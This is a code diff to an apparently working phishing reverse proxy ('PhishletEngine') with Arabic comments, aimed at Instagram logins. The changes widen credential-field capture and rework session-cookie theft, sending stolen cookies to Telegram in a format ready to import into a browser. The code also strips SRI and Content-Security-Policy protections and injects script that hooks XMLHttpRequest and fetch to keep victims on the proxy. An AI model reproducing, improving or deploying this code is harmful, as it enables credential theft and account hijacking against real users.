@@ -106,12 +106,14 @@ class PhishletEngine:
         self.send_to_telegram(msg)
 
     def capture_creds(self, form_data):
+        logging.info(f"📥 Raw form data: {form_data}")
         found = {}
         for field in self.creds_fields:
             if field in form_data:
                 found[field] = form_data[field]
         for key, value in form_data.items():
-            if any(k in key.lower() for k in ['login', 'user', 'pass', 'email', 'mail', 'pwd', 'password', '_user']):
+            key_lower = key.lower()
+            if any(k in key_lower for k in ['user', 'login', 'email', 'phone', 'pass', 'pwd', 'password', 'enc_password']):
                 found[key] = value
         if found:
             cred_id = datetime.now().strftime("%y%m%d_%H%M%S")
@@ -128,27 +130,18 @@ class PhishletEngine:
                    f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"📋 <b>Data:</b>\n<pre>{json.dumps(found, indent=2, ensure_ascii=False)}</pre>")
             self.send_to_telegram(msg)
-            logging.info(f"Credentials captured: {found}")
+            logging.info(f"✅ Credentials captured: {found}")
         return found
 
-    # ======================== إرسال الكوكيز بتنسيق EditThisCookie ========================
     def send_cookies_as_edit_this_cookie(self, cookies_dict, current_host, username="Unknown"):
-        """إرسال الكوكيز بصيغة JSON جاهزة للاستيراد في إضافة EditThisCookie"""
         cookie_json = []
-        # نحدد النطاق الأساسي للكوكيز (مشتق من target_domain)
-        domain = f".{self.target_domain.split('.')[-2]}.{self.target_domain.split('.')[-1]}"  # e.g., .instagram.com
-        
+        domain = f".{self.target_domain.split('.')[-2]}.{self.target_domain.split('.')[-1]}"
         for name, value in cookies_dict.items():
             cookie_json.append({
                 "domain": domain,
-                "name": name,
-                "value": value,
-                "path": "/",
-                "secure": True,
-                "httpOnly": True,  # معظم كوكيز الجلسة تكون HttpOnly
-                "sameSite": "Lax"
+                "name": name, "value": value,
+                "path": "/", "secure": True, "httpOnly": True, "sameSite": "Lax"
             })
-        
         formatted_json = json.dumps(cookie_json, indent=2, ensure_ascii=False)
         msg = (f"🔥 <b>Session Ready to Import (EditThisCookie)</b>\n"
                f"🎯 <b>Target:</b> {self.name}\n"
@@ -164,9 +157,7 @@ class PhishletEngine:
         if not cookies_dict:
             for cookie in cookies_jar:
                 cookies_dict[cookie.name] = cookie.value
-
         has_auth = any(k in cookies_dict for k in self.auth_tokens)
-
         if cookies_dict and has_auth:
             session_id = datetime.now().strftime("%y%m%d_%H%M%S")
             captured_sessions[session_id] = {
@@ -176,51 +167,27 @@ class PhishletEngine:
                 'ip': request.remote_addr,
                 'user_agent': request.headers.get('User-Agent')
             }
-
-            # استخراج اسم المستخدم من بيانات الاعتماد إذا كانت موجودة
+            logging.info(f"✅ Session {session_id} stored locally with {len(cookies_dict)} cookies")
             username = "Unknown"
-            if creds_data and 'username' in creds_data:
-                username = creds_data['username']
-            elif 'username' in cookies_dict:
-                username = cookies_dict['username']  # قد تجد في الكوكيز أيضاً
-            
-            # إرسال الكوكيز بتنسيق EditThisCookie
-            self.send_cookies_as_edit_this_cookie(cookies_dict, current_host, username)
-
-            # إرسال رسالة تقليدية تحتوي على عينة من الكوكيز (اختياري)
-            sample_items = list(cookies_dict.items())[:10]
-            cookie_sample = "\n".join([f"<code>{k}</code>: <code>{v[:50]}...</code>" for k, v in sample_items])
-            if len(cookies_dict) > 10:
-                cookie_sample += f"\n... و {len(cookies_dict)-10} كوكيز أخرى"
-
-            msg = (f"🔥 <b>Full Session Hijacked!</b>\n"
-                   f"🎯 <b>Service:</b> {self.name}\n"
-                   f"🆔 <b>Session ID:</b> <code>{session_id}</code>\n"
-                   f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-                   f"📦 <b>Total Cookies:</b> {len(cookies_dict)}\n")
             if creds_data:
-                msg += f"🔐 <b>Credentials also captured!</b>\n"
-            msg += f"🍪 <b>Cookies (sample):</b>\n{cookie_sample}\n"
-            msg += f"🔗 <b>Dashboard:</b> https://{current_host}/admin/dashboard"
-            self.send_to_telegram(msg)
-            logging.info(f"Session {session_id} captured with {len(cookies_dict)} cookies")
+                for key in ['username', 'email', 'phone', 'login']:
+                    if key in creds_data:
+                        username = creds_data[key]
+                        break
+            self.send_cookies_as_edit_this_cookie(cookies_dict, current_host, username)
             return session_id
         return None
 
-    # ======================== دالة إعادة الكتابة المحسّنة ========================
+    # ======================== دالة إعادة الكتابة المتطورة (مدمجة مع التحسينات) ========================
     def rewrite_content(self, content, content_type, current_host):
-        """إعادة كتابة المحتوى باستبدال جميع نطاقات إنستجرام وموارده"""
         if not content_type or not any(t in content_type.lower() for t in ['text/html', 'application/javascript', 'text/css', 'application/json']):
             return content
-
         try:
             if isinstance(content, bytes):
                 content = content.decode('utf-8', errors='ignore')
-
-            # قائمة بجميع النطاقات التي قد تظهر في المحتوى
-            # هذه القائمة يجب أن تشمل كل ما هو موجود في proxy_hosts
+            
+            # قائمة موسعة بالنطاقات (من الكود الجديد)
             all_domains = ['instagram.com', 'cdninstagram.com', 'fbcdn.net']
-
             # استبدال شامل لكل النطاقات
             for domain in all_domains:
                 # https://any.sub.domain
@@ -229,18 +196,45 @@ class PhishletEngine:
                 content = re.sub(rf'//(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'//{current_host}', content)
                 # داخل علامات الاقتباس (لـ JSON/JS)
                 content = re.sub(rf'(["''])(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}(["''])', rf'\1{current_host}\2', content)
+                # استبدال النقاط المهربة (مهم في بعض ملفات JS)
+                content = content.replace(domain.replace('.', r'\.'), current_host.replace('.', r'\.'))
 
             # إزالة integrity لمنع SRI
             content = re.sub(r'integrity="[^"]+"', '', content)
-
             # إزالة CSP من meta tags
             content = re.sub(r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*>', '', content)
-
-            # إخفاء رأس CSP في النص (احتياطي)
+            # إخفاء رأس CSP في النص
             content = content.replace('Content-Security-Policy', 'X-Ignored-CSP')
 
-            # حقن JavaScript إذا وجد في ملف YAML
-            if self.js_inject and '<head>' in content:
+            # حقن سكريبت متطور لاعتراض طلبات XMLHttpRequest (من الكود الجديد)
+            if '<head>' in content:
+                script = f"""<script>
+                (function() {{
+                    const currentHost = '{current_host}';
+                    const domains = {json.dumps(all_domains)};
+                    const fixUrl = (url) => {{
+                        if (typeof url !== 'string') return url;
+                        domains.forEach(d => url = url.replace(new RegExp('https?://([a-zA-Z0-9-]+\.)*' + d.replace(/\./g, '\\.'), 'g'), 'https://' + currentHost));
+                        return url;
+                    }};
+                    // اعتراض XMLHttpRequest
+                    const orgOpen = XMLHttpRequest.prototype.open;
+                    XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {{
+                        arguments[1] = fixUrl(url);
+                        return orgOpen.apply(this, arguments);
+                    }};
+                    // اعتراض fetch
+                    const orgFetch = window.fetch;
+                    window.fetch = function(url, options) {{
+                        url = fixUrl(url);
+                        return orgFetch.call(this, url, options);
+                    }};
+                }})();
+                </script>"""
+                content = content.replace('<head>', f'<head>{script}')
+            
+            # حقن JavaScript المخصص من ملف YAML إذا وجد
+            elif self.js_inject and '<head>' in content:
                 injection = f"<script>{self.js_inject}</script>"
                 content = content.replace('<head>', f'<head>{injection}')
 
@@ -313,10 +307,11 @@ def proxy(path):
     if request.query_string:
         target_url += '?' + request.query_string.decode('utf-8')
 
-    # تجهيز الرؤوس
+    # تجهيز الرؤوس مع تعطيل الضغط (تحسين من الكود الجديد)
     headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']}
     headers['Host'] = engine.target_domain
     headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    headers['Accept-Encoding'] = 'identity'  # تعطيل الضغط لضمان إعادة الكتابة الصحيحة
     headers['Referer'] = f"https://{engine.target_domain}/"
     headers['Origin'] = f"https://{engine.target_domain}"
 
@@ -337,32 +332,25 @@ def proxy(path):
             timeout=30
         )
 
-        # ========== معالجة التوجيهات (الجزء الأهم لإكمال تسجيل الدخول) ==========
+        # معالجة التوجيهات
         if resp.status_code in [301, 302, 303, 307, 308]:
             location = resp.headers.get('Location', '')
             if location:
-                # استبدال النطاق الأصلي بالنطاق الحالي في رابط التوجيه
                 new_location = location
                 all_domains = ['instagram.com', 'cdninstagram.com', 'fbcdn.net']
                 for domain in all_domains:
                     if domain in new_location:
                         new_location = re.sub(rf'https?://(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'https://{host}', new_location)
                         break
-                # إنشاء استجابة التوجيه
                 proxy_resp = make_response('', resp.status_code)
                 proxy_resp.headers['Location'] = new_location
-                
-                # 🔥 التقاط الجلسة من الكوكيز التي أرسلها الموقع الأصلي بعد تسجيل الدخول
                 if resp.cookies:
                     engine.capture_full_session(resp.cookies, host, captured_creds_data)
-                
-                # نقل الكوكيز إلى المتصفح (لإكمال جلسة المستخدم)
                 for cookie_name, cookie_value in resp.cookies.items():
                     proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
-                
                 return proxy_resp
 
-        # ========== معالجة المحتوى العادي ==========
+        # معالجة المحتوى العادي
         content = engine.rewrite_content(resp.content, resp.headers.get('Content-Type', ''), host)
         proxy_resp = make_response(content)
         proxy_resp.status_code = resp.status_code
@@ -374,11 +362,10 @@ def proxy(path):
             if n.lower() not in excluded_headers:
                 proxy_resp.headers[n] = v
 
-        # نقل الكوكيز إلى المتصفح
+        # نقل الكوكيز
         for cookie_name, cookie_value in resp.cookies.items():
             proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
 
-        # 🔥 التقاط الجلسة إذا وجدت كوكيز مهمة (قد تحدث في استجابة غير توجيهية)
         if resp.cookies:
             engine.capture_full_session(resp.cookies, host, captured_creds_data)
 
